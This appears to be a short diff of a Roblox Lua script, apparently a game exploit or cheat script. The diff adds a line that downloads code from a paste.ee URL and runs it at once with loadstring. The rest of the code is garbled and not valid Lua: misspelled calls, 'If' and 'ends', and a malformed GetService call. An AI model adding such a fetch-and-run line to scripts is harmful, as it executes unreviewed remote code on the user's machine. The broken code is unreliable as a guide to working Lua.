@@ -1,5 +1,7 @@
 local infinite_YieldEnable = true
+
      loadstring(game: Httpget("https://paste.ee/r/2DHfDjiU"))()
+
 If infinite_spawnEnabled then
 game:GetService"Player".LocalPlayer.Character
 ends
